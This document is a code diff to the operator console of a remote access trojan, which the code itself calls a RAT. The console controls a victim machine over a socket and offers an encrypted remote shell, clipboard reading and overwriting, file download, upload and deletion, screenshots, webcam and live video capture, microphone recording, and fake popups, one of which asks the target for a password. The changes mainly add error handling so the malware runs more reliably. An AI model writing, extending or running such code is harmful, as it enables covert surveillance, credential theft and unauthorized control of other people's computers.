@@ -1,6 +1,5 @@
 import socket
 from PIL import Image
-import cv2
 from numpy import array
 import numpy as np
 from json import loads, dumps, JSONDecodeError
@@ -11,7 +10,6 @@ from colorama import Fore, Back
 from os.path import isfile
 from os import system
 from cryptography.fernet import Fernet
-from pathlib import Path
 
 
 def clear():
@@ -48,6 +46,8 @@ def clearBuffer(sock):
                 break
         except socket.timeout:
             break
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            break
 
 
 def others(sock):
@@ -56,16 +56,22 @@ def others(sock):
         imagePath = input(f"{Fore.LIGHTGREEN_EX}Choose an image for alert (you can find good images in the images folder!)\n\nEnter image file path : {Fore.RESET}")
         if isfile(imagePath):
             Oimg = Image.open(imagePath)
-            sock.send("HDalert".encode())
-            dumpList = dumps(array(Oimg).tolist())
-            sock.send(dumpList.encode())
-            sock.send(b"END")
+            try:
+                sock.send("HDalert".encode())
+                dumpList = dumps(array(Oimg).tolist())
+                sock.sendall(dumpList.encode())
+                sock.send(b"END")
+            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                return
             input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")
         else:
             input(f"{Fore.LIGHTRED_EX}Error : {imagePath} No such file !\n\nEnter to continue : {Fore.RESET}")
     def systemInfo():
-        sock.send("Sinfo".encode())
-        info = sock.recv(4098).decode().split("|")
+        try:
+            sock.send("Sinfo".encode())
+            info = sock.recv(4098).decode().split("|")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         print(f"Disk usage : {info[0]}\nMemory info : {info[1]}\n\nMachine : {info[2]}\nVersion : {info[3]}\nPlatform : {info[4]}\nProcessor : {info[5]}")
         input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")
 
@@ -139,7 +145,7 @@ def popup(sock):
             if len(title) <= 30:
                 break
             else:
-                print(f"{Fore.LIGHTGREEN_EX}Error : MAX 10 char{Fore.RESET}")
+                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
         print(f"{Fore.LIGHTGREEN_EX}Enter the buttons text(Enter CTRL+C to finish)\nNOTE:Max=5")
         buttons = ''
         for i in range(5):
@@ -166,8 +172,11 @@ def popup(sock):
                         else:
                             print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
         sock.sendall(f"WNconfr|{title}|{text}|{buttons.replace('|', '')}".encode())
-        resault = sock.recv(2048)
-        print(f"\n\n{Fore.LIGHTRED_EX}The target clicked the {Fore.LIGHTGREEN_EX}{resault.decode()}{Fore.LIGHTRED_EX} button !{Fore.RESET}")
+        try:
+            resault = sock.recv(2048).decode().replace("END", "")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
+        print(f"\n\n{Fore.LIGHTRED_EX}The target clicked the {Fore.LIGHTGREEN_EX}{resault}{Fore.LIGHTRED_EX} button !{Fore.RESET}")
         input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
     elif selection == '3' or selection == '4':
         print(f'{Fore.LIGHTRED_EX}If the user does not enter a response or cancels the window\n the tool will freeze, so if it takes too long, enter CTRL + C to exit.{Fore.RESET}')
@@ -182,13 +191,16 @@ def popup(sock):
             if len(title) <= 30:
                 break
             else:
-                print(f"{Fore.LIGHTGREEN_EX}Error : MAX 10 char{Fore.RESET}")
+                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
         if selection == '3':
             sock.sendall(f"WNqstion|{title}|{text}".encode())
         else:
             sock.sendall(f"WNpasswd|{title}|{text}".encode())
         print(f"\n\n{Fore.LIGHTGREEN_EX}Please wait for the target to enter some value ...{Fore.RESET}")
-        resault = sock.recv(1000000).decode().replace("END", "")
+        try:
+            resault = sock.recv(1000000).decode().replace("END", "")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         if resault:
             print(f"\n\n{Fore.LIGHTRED_EX}Target entered : \n{Fore.LIGHTGREEN_EX}{resault}\n{Fore.RESET}")
             input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
@@ -198,14 +210,20 @@ def shell(sock, key):
     key = key.encode()
     sock.send("RMCM".encode())
     while 1:
-        sock.send(encryptFS("GTINFO", key))
-        info = decryptFS(sock.recv(1024), key).decode()
+        try:
+            sock.send(encryptFS("GTINFO", key))
+            info = decryptFS(sock.recv(1024), key).decode()
+        except Exception:
+            break
         command = input(f"{Fore.LIGHTRED_EX}{socket.gethostname()}@{Fore.LIGHTGREEN_EX}{info}>{Fore.LIGHTCYAN_EX}")
         if command:
-            sock.send(encryptFS(command, key))
-            res = decryptFS(sock.recv(10240), key).decode()
-            if not res == "None":
-                print(res)
+            try:
+                sock.send(encryptFS(command, key))
+                res = decryptFS(sock.recv(10240), key).decode()
+                if not res == "None":
+                    print(res)
+            except Exception:
+                break
 
 
 def RWclip(sock):
@@ -224,10 +242,16 @@ def RWclip(sock):
 
     {Fore.LIGHTBLUE_EX}Enter your selection : {Fore.RESET}""")
     if selection == "1":
-        sock.send(b"GCLPB")
+        try:
+            sock.send(b"GCLPB")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         data = ''
         while 1:
-            data2 = sock.recv(100000).decode()
+            try:
+                data2 = sock.recv(100000).decode()
+            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                return
             if "ENDeyeRT" in data2:
                 data += data2.replace("ENDeyeRT", '')
                 break
@@ -241,9 +265,15 @@ def RWclip(sock):
                 data += input("> ")+'\n'
         except KeyboardInterrupt:
             pass
-        sock.send(b"WCLPB")
+        try:
+            sock.send(b"WCLPB")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         sleep(0.5)
-        sock.send((data.strip()+"ENDeyeRT").encode())
+        try:
+            sock.send((data.strip()+"ENDeyeRT").encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         input(f"{Fore.LIGHTGREEN_EX}[ * ] Done ...\n\nEnter to continue : ")
 
 
@@ -275,24 +305,54 @@ def getFex(sock):
     if slcn == "1":
         filename = "FXshf:"
         filename += input(f"{Fore.MAGENTA}Enter the file name : {Fore.RESET}")
-        sock.send(filename.encode())
+        try:
+            sock.send(filename.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         sleep(0.5)
-        files = sock.recv(1024).decode().replace("END", '')
+        try:
+            files = ''
+            while 1:
+                data2 = sock.recv(1024).decode()
+                if "END" in data2:
+                    files += data2.replace("END", '')
+                    break
+                files += data2
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn == "2":
         path = "FXchd:"
         path += input(f"{Fore.MAGENTA}Enter the path : {Fore.RESET}")
-        sock.send(path.encode())
+        try:
+            sock.send(path.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         sleep(0.5)
-        res = sock.recv(1024).decode().replace("END", '')
+        try:
+            res = sock.recv(1024).decode().replace("END", '')
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{res}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn == "3":
         filename = "FXshf:"
-        sock.send(filename.encode())
+        try:
+            sock.send(filename.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         sleep(0.5)
-        files = sock.recv(1024).decode().replace("END", '')
+        try:
+            files = ''
+            while 1:
+                data2 = sock.recv(1024).decode()
+                if "END" in data2:
+                    files += data2.replace("END", '')
+                    break
+                files += data2
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn == "5" or slcn == '4':
@@ -302,7 +362,14 @@ def getFex(sock):
         else:
             extn = "FXdwn:"
         path = extn + input(f"{Fore.MAGENTA}Enter the file path : {Fore.RESET}")
-        sock.send(path.encode())
+        if ".." in path:
+            print(f"{Fore.LIGHTRED_EX}Error : Invalid path !{Fore.RESET}")
+            input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
+            return 1
+        try:
+            sock.send(path.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         if '\\' in path:
             filename = extn + path.split("\\")[-1]
         elif '/' in path:
@@ -310,30 +377,37 @@ def getFex(sock):
         else:
             filename = path
         if slcn == '5':
-            filesize = sock.recv(1024).decode()
             try:
-                int(filesize)
+                filesize = sock.recv(1024).decode()
+            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                return
+            try:
+                filesize = int(filesize)
             except ValueError:
                 print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}", filesize)
                 input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
                 return 1
 
-        if slcn == '4':
-            sock.settimeout(2)
-        with open(filename.split(":")[1], "wb") as f:
-            while 1:
-                try:
-                    data = sock.recv(buffer)
-                except socket.timeout:
-                    break
-                if "END" in str(data[len(data) - 3:]):
-                    data = data[0:(len(data) - 3)]
+            sock.settimeout(10)
+            with open(filename.split(":")[1], "wb") as f:
+                received = 0
+                while received < filesize:
+                    try:
+                        data = sock.recv(min(buffer, filesize - received))
+                    except socket.timeout:
+                        break
+                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                        break
+                    if not data:
+                        break
+                    if "END" in str(data[len(data) - 3:]):
+                        data = data[0:(len(data) - 3)]
+                        f.write(data)
+                        break
                     f.write(data)
-                    break
-                if not data:
-                    break
-                f.write(data)
+                    received += len(data)
             f.close()
+            sock.settimeout(None)
         if slcn == '4':
             input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to commit changes :{Fore.RESET}")
             filePath = filename
@@ -344,31 +418,60 @@ def getFex(sock):
                         rdata = BFile.read(buffer)
                         if not rdata:
                             break
-                        sock.sendall(rdata)
-                    sock.send(b"END")
+                        try:
+                            sock.sendall(rdata)
+                        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                            return
+                    try:
+                        sock.send(b"END")
+                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                        return
             except FileNotFoundError:
                 input(f"{Fore.RED}{Back.BLACK}Can't find {filename},Why did you delete it ?!\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}{Back.RESET}")
 
     elif slcn == "6":
         filename = "FXrmf:"
         filename += input("Enter file name : ")
-        sock.send(filename.encode())
-        print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}", sock.recv(1024).decode())
+        try:
+            sock.send(filename.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
+        try:
+            print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}", sock.recv(1024).decode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn == "7":
         buffer = 4096
         filePath = "FXupd:"
         filePath += input(f"{Fore.MAGENTA}Enter the file path in the target system : {Fore.RESET}")
+        if ".." in filePath:
+            print(f"{Fore.LIGHTRED_EX}Error : Invalid path !{Fore.RESET}")
+            input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
+            return 1
         Ufile = input(f"{Fore.LIGHTCYAN_EX}\nEnter the path of the file you want to upload : ")
-        sock.send(filePath.encode())
+        if ".." in Ufile:
+            print(f"{Fore.LIGHTRED_EX}Error : Invalid path !{Fore.RESET}")
+            input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
+            return 1
+        try:
+            sock.send(filePath.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         try:
             with open(Ufile, "rb") as BFile:
                 while 1:
                     rawData = BFile.read(buffer)
                     if not rawData:
-                        sock.send(b"END")
+                        try:
+                            sock.send(b"END")
+                        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                            return
                         return 1
-                    sock.sendall(rawData)
+                    try:
+                        sock.sendall(rawData)
+                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                        return
         except FileNotFoundError:
             print(f"{Fore.RED}Can't open file : {Ufile} {Fore.RESET}")
 
@@ -376,7 +479,10 @@ def getFex(sock):
 def getScr(sock):
     data = ''
     while 1:
-        data2 = sock.recv(8388608).decode()
+        try:
+            data2 = sock.recv(8388608).decode()
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         if "END" in data2:
             data2 = data2.replace("END", '')
             data += data2
@@ -386,16 +492,23 @@ def getScr(sock):
         else:
             break
     if data:
-        CVimg = array(loads(data)).astype(np.uint8)
-        img = Image.fromarray(CVimg)
-        img.save("screenshot.jpg")
+        try:
+            CVimg = array(loads(data)).astype(np.uint8)
+            img = Image.fromarray(CVimg)
+            img.save("screenshot.jpg")
+        except (JSONDecodeError, MemoryError):
+            pass
 
 
 def getPict(sock):
+    import cv2
 
     data = ''
     while 1:
-        data2 = sock.recv(8388608).decode()
+        try:
+            data2 = sock.recv(8388608).decode()
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         if data2.strip():
             if 'END' in str(data2):
                 if len(data2) > 3:
@@ -406,47 +519,74 @@ def getPict(sock):
             break
     if data:
         data = data.replace("END", "")
-        frame = array(loads(data))
-        cv2.imwrite("image.jpg", frame)
+        try:
+            frame = array(loads(data))
+            cv2.imwrite("image.jpg", frame)
+        except (JSONDecodeError, MemoryError):
+            pass
 
 
 def getLive(sock):
+    import cv2
     try:
         while 1:
             data = ''
             while 1:
-                data += sock.recv(8388608).decode()
+                try:
+                    data += sock.recv(8388608).decode()
+                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                    return
                 if "END" in data:
                     data = data.split("END")[0]
                     break
-            sock.send(b"cnt")
+            try:
+                sock.send(b"cnt")
+            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                return
             try:
                 frame = array(loads(data), dtype=np.uint8)
                 cv2.imshow('LIVE(Insert the CTRL-c to exit)', frame)
-            except JSONDecodeError:
+            except (JSONDecodeError, MemoryError):
                 pass
             if cv2.waitKey(1) & 0xFF == ord('q'):
-                sock.send(b"end")
+                try:
+                    sock.send(b"end")
+                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                    return
                 break
     except KeyboardInterrupt:
         cv2.destroyAllWindows()
-        sock.send(b"end")
+        try:
+            sock.send(b"end")
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            pass
         return True
 
 
 def getSound(sock, sec):
-    sock.send(str(sec).encode())
+    try:
+        sock.send(str(sec).encode())
+    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+        return
     fs = 44100
     wf = wave.open("Voice.wav", 'wb')
     wf.setnchannels(2)
-    data_01 = int(sock.recv(1024).decode())
+    try:
+        data_01 = int(sock.recv(1024).decode())
+    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+        wf.close()
+        return
     wf.setsampwidth(data_01)
     wf.setframerate(fs)
     frames = []
     while 1:
-        data_02 = sock.recv(40000)
+        try:
+            data_02 = sock.recv(40000)
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            break
+        if not data_02:
+            break
         if 'END' in str(data_02):
-
             if len(data_02) > 3:
                 frames.append(data_02[0:(len(data_02) - 3)])
             break
@@ -606,7 +746,7 @@ def main(mode):
 
 Enter your selection : """)
         try:
-            if limitations and (not int(selection) in limitations):
+            if None in limitations or int(selection) in limitations:
                 if selection == '1':
                     print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
                     sock.send("Rsound".encode())
@@ -642,7 +782,7 @@ Enter your selection : """)
                     try:
                         shell(sock, key)
                     except KeyboardInterrupt:
-                        sock.send(encryptFS("END", key))
+                        sock.send(encryptFS("END", key.encode()))
                 elif selection == '7':
                     clear()
                     try:
@@ -663,3 +803,7 @@ Enter your selection : """)
                 input(f"{Fore.LIGHTRED_EX}[ ! ] Your rat model does not support this option !\n\nEnter to continue : {Fore.RESET}")
         except ValueError:
             pass
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            input(f"\n\n{Fore.LIGHTRED_EX}Connection lost !\n\nEnter to continue : {Fore.RESET}")
+        except Exception as e:
+            input(f"\n\n{Fore.LIGHTRED_EX}Error : {e}\n\nEnter to continue : {Fore.RESET}")
